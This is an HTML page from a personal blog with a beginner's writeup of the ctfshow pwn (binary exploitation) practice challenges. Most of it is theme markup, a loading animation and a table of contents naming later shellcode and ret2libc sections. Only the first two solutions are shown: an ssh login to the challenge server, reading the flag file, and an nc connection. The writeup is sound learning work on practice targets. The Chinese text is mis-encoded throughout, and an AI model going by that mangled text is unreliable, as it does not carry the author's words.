<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWN_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜">
<title>ctfshow-pwn-writeup</title>

<link rel='canonical' href='https://expl0rer.top/p/ctfshow-pwn-writeup/'>

<link rel="stylesheet" href="/scss/style.min.2c77b19359813276c65acd84dec34da71ed0ee906a8812f34e2c2899887b4ce7.css"><meta property='og:title' content="ctfshow-pwn-writeup">
<meta property='og:description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWN_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜">
<meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-02T00:04:55&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
<meta name="twitter:title" content="ctfshow-pwn-writeup">
<meta name="twitter:description" content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWN_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#test_your_nc">Test_your_nc</a>
      <ol>
        <li><a href="#pwn_000">PWN_000</a>
          <ol>
            <li><a href="#è§£é¢˜è¿‡ç¨‹">è§£é¢˜è¿‡ç¨‹</a></li>
          </ol>
        </li>
        <li><a href="#pwn_001">PWN_001</a></li>
        <li><a href="#pwn_002">PWN_002</a></li>
        <li><a href="#pwn_003">PWN_003</a></li>
        <li><a href="#pwn_004">PWN_004</a></li>
      </ol>
    </li>
    <li><a href="#å‰ç½®åŸºç¡€">å‰ç½®åŸºç¡€</a>
      <ol>
        <li><a href="#pwn_005">PWN_005</a></li>
        <li><a href="#pwn_006">PWN_006</a></li>
        <li><a href="#pwn_007">PWN_007</a></li>
        <li><a href="#pwn_008">PWN_008</a></li>
        <li><a href="#pwn_009">PWN_009</a></li>
        <li><a href="#pwn_010">PWN_010</a></li>
        <li><a href="#pwn_011">PWN_011</a></li>
        <li><a href="#pwn_012">PWN_012</a></li>
        <li><a href="#pwn_013">PWN_013</a></li>
        <li><a href="#pwn_014">PWN_014</a></li>
        <li><a href="#pwn_015">PWN_015</a></li>
        <li><a href="#pwn_016">PWN_016</a></li>
        <li><a href="#pwn_017">PWN_017</a></li>
        <li><a href="#pwn_018">PWN_018</a></li>
        <li><a href="#pwn_019">PWN_019</a></li>
        <li><a href="#pwn_020">PWN_020</a></li>
        <li><a href="#pwn_021">PWN_021</a></li>
        <li><a href="#pwn_021-1">PWN_021</a></li>
        <li><a href="#pwn_023">PWN_023</a></li>
        <li><a href="#pwn_024">PWN_024</a>
          <ol>
            <li><a href="#é¢˜ç›®">é¢˜ç›®ï¼š</a></li>
            <li><a href="#ä¸ç›®æ ‡ç¨‹åºäº¤äº’">ä¸ç›®æ ‡ç¨‹åºäº¤äº’</a></li>
            <li><a href="#äºŒè¿›åˆ¶æ•°æ®å¤„ç†">äºŒè¿›åˆ¶æ•°æ®å¤„ç†</a></li>
            <li><a href="#è¾…åŠ©æ¼æ´åˆ©ç”¨">è¾…åŠ©æ¼æ´åˆ©ç”¨</a></li>
            <li><a href="#å¯†ç å­¦ç›¸å…³è¾…åŠ©">å¯†ç å­¦ç›¸å…³è¾…åŠ©</a></li>
            <li><a href="#å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ">å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ</a></li>
            <li><a href="#é¢˜ç›®åç»­">é¢˜ç›®åç»­ï¼š</a></li>
            <li><a href="#é€è¡Œè§£ææ‰‹æ•²shellcode">é€è¡Œè§£ææ‰‹æ•²shellcode</a></li>
          </ol>
        </li>
        <li><a href="#pwn_025å¾…å®š">PWN_025ï¼ˆå¾…å®šï¼‰</a>
          <ol>
            <li><a href="#ret2libcå®ç°æ­¥éª¤">ret2libcå®ç°æ­¥éª¤</a></li>
          </ol>
        </li>
        <li><a href="#pwn_026">PWN_026</a></li>
        <li><a href="#pwn_027">PWN_027</a></li>
        <li><a href="#pwn_028">PWN_028</a></li>
        <li><a href="#pwn_029">PWN_029</a></li>
        <li><a href="#pwn_030">PWN_030</a></li>
        <li><a href="#pwn_031å¾…å®š">PWN_031ï¼ˆå¾…å®šï¼‰</a></li>
        <li><a href="#fortifyç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥"><strong>FORTIFYç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong></a></li>
        <li><a href="#pwn_032">PWN_032</a></li>
        <li><a href="#pwn_033">PWN_033</a></li>
        <li><a href="#pwn_034">PWN_034</a></li>
      </ol>
    </li>
    <li><a href="#æ ˆæº¢å‡º">æ ˆæº¢å‡º</a>
      <ol>
        <li><a href="#pwn_035">PWN_035</a></li>
        <li><a href="#binshåœ°å€çš„è·³è½¬åˆ©ç”¨"><strong>/bin/shåœ°å€çš„è·³è½¬åˆ©ç”¨</strong></a></li>
        <li><a href="#pwn_036">PWN_036</a></li>
        <li><a href="#pwn_037">PWN_037</a></li>
        <li><a href="#pwn_038">PWN_038</a></li>
        <li><a href="#pwn_039">PWN_039</a></li>
        <li><a href="#pwn_040">PWN_040</a></li>
        <li><a href="#32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº"><strong>32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº</strong></a></li>
        <li><a href="#pwn_041">PWN_041</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/ctfshow-pwn-writeup/">
                <img src="/p/ctfshow-pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png"
                        srcset="/p/ctfshow-pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png 800w, /p/ctfshow-pwn-writeup/ctfshow_hu_ecf2a63f33ea59e3.png 1600w"
                        width="800" 
                        height="405" 
                        loading="lazy"
                        alt="Featured image of post ctfshow-pwn-writeup" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-pwn-writeup/">ctfshow-pwn-writeup</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWN_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-27</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>**å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
    >ctfshow</a>çš„PWNåšé¢˜è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼**è¿˜æœ‰å°±æ˜¯ctfshow-pwnæ˜¯æˆ‘å…¥é—¨PWNçš„ç¬¬ä¸€å¥—é¢˜ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œçœ‹å®˜æ–¹writeupå¯ä»¥çŸ¥é“æ¯”è¾ƒç®€æ´ï¼Œä½†æœ‰äº›æˆ‘çœ‹ä¸æ‡‚ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±åšçš„è¿‡ç¨‹ä¸­å†™çš„ï¼Œéƒ½æ˜¯å‘è‡ªå†…å¿ƒç†è§£å®ƒä»¬çš„è¯ï¼Œæœ‰äº›å¯èƒ½æ¯”è¾ƒå•°å—¦ï¼Œä½†ä¹Ÿå¿…é¡»è¿™æ ·ï¼Œå› ä¸ºç«™åœ¨æ–°æ‰‹è§’åº¦æ¥çœ‹å¿…é¡»è¦è¿™ç§å•°å—¦æ–¹å¼å»ç†è§£æ‰èƒ½æ›´æ·±åˆ»ï¼Œæœ‰è€å¿ƒçš„æœ‹å‹å¯ä»¥ä¸€ç›´çœ‹ä¸‹å»ï¼Œå½“ç„¶ä¹Ÿæ¬¢è¿PWNå¤§ä½¬å‰æ¥æŒ‘æˆ˜æˆ‘ï¼ï¼ï¼ğŸ˜„</p>
<h2 id="test_your_nc">Test_your_nc
</h2><h3 id="pwn_000">PWN_000
</h3><p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒ</a>ï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç showï¼›è™šæ‹Ÿæœºé•œåƒï¼Œç”¨æˆ·åä¸ºctfshowï¼Œå¯†ç æ˜¯ctfshowã€‚</p>
<p>çœ‹äº†è¯¾ä¹Ÿå•¥éƒ½ä¸ä¼šæˆ–è€…å·¥å…·ä¸ä¼šä¸‹çœ‹è¿™&ndash;&gt;<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/"  target="_blank" rel="noopener"
    >CTF Wiki-PWN</a></p>
<h4 id="è§£é¢˜è¿‡ç¨‹">è§£é¢˜è¿‡ç¨‹
</h4><p>sshè¿æ¥ï¼ˆè®°å¾—ç»™è™šæ‹Ÿæœºkali\Ubuntuæˆ–è€…ä¸»æœºè®¾ç½®æ‰“å¼€SSHï¼‰ï¼š</p>
<p><code>ssh ctfshow@pwn.challenge.ctf.show -pxxxx</code></p>
<p>ä¸€å¼€å§‹ä¼šè®©ä½ è¾“å…¥yes/noçš„ï¼Œç›´æ¥yesï¼Œç„¶åè¾“å…¥å¯†ç ï¼Œç­‰è¿›ç¨‹ç»“æŸä¼šæœ‰ä¸ªäº¤äº’shell</p>
<p><img src="/p/ctfshow-pwn-writeup/1.png"
	width="1184"
	height="570"
	srcset="/p/ctfshow-pwn-writeup/1_hu_dff3e732402d7aaa.png 480w, /p/ctfshow-pwn-writeup/1_hu_5121a93a292ddbe4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>ç”¨å‘½ä»¤lsæ‰“å¼€çœ‹ä¸€ä¸‹æœ‰å•¥æ–‡ä»¶ï¼Œçœ‹åˆ°æœ‰ä¸ªctfshow_flagçš„æ–‡ä»¶ï¼ŒçŒœæ˜¯ä¸ªè£…flagçš„æ–‡ä»¶å¤¹ï¼Œç›´æ¥ç”¨catå‘½ä»¤æ‰“å¼€å°±å¥½ã€‚æ³¨æ„æ–œæ /ã€‚</p>
<h3 id="pwn_001">PWN_001
</h3><p>é¢˜ç›® <a class="link" href="PWN_001" >PWN_001</a> ï¼šæä¾›åé—¨å‡½æ•°ï¼Œè¿ä¸Šå³å¯å¾—åˆ°flag</p>
<p>è¿™é‡Œæœ‰ç”¨åˆ°â€œ<a class="link" href="https://ctf.xidian.edu.cn/wiki/13"  target="_blank" rel="noopener"
    ><code>nc</code></a>â€è¿æ¥ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œæ–¹ä¾¿åç»­åšé¢˜ã€‚å½“ç„¶Kaliè‡ªå¸¦ncè¿æ¥çš„ï¼Œä½ ç”¨Kaliå¹²PWNä¹Ÿè¡Œã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/2.png"
	width="826"
	height="310"
	srcset="/p/ctfshow-pwn-writeup/2_hu_d89a142dd65a19e2.png 480w, /p/ctfshow-pwn-writeup/2_hu_5516dc48b2b77e6e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<p>è¿™é¢˜é€åˆ†çš„ï¼Œncè¿æ¥ä¸€ä¸‹å°±çˆ†flagäº†ã€‚</p>
<p>ä¸è¿‡è¯´å®è¯æˆ‘æ˜¯çœŸä¸çŸ¥é“PWN_001æ–‡ä»¶ç»™æ¥å¹²å˜›çš„ï¼Œç›´æ¥ncäº¤äº’ä¸€ä¸‹å°±å‡ºflagäº†ï¼Œè¿™é¢˜æ²¡ææ‡‚ctfshowæ„å›¾åœ¨å“ªã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/3.png"
	width="1010"
